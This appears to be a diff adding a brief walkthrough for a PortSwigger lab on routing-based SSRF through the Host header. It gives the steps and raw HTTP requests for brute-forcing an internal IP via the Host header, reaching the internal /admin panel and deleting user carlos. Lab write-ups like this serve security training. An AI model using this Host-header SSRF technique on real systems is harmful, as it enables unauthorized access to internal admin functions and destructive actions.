@@ -1,0 +1,20 @@
+The steps below are meant to solve the following lab:
+https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf
+
+IP Range: 192.168.0.0/24
+
+
+Intercept a request to "/admin".
+Change Host header value to "192.168.0.0".
+Send to intruder and bruteforce last last octet, from 0 to 255, until 302 response code present.
+Once IP Address is found send request to "/admin" with host header changed to newly found IP address.
+
+GET /admin HTTP/1.1
+Host: 192.168.0.62
+
+Intercept request to delete Carlos.
+
+POST /admin/delete HTTP/1.1
+Host: 192.168.0.62
+
+csrf=[TOKEN]&username=carlos
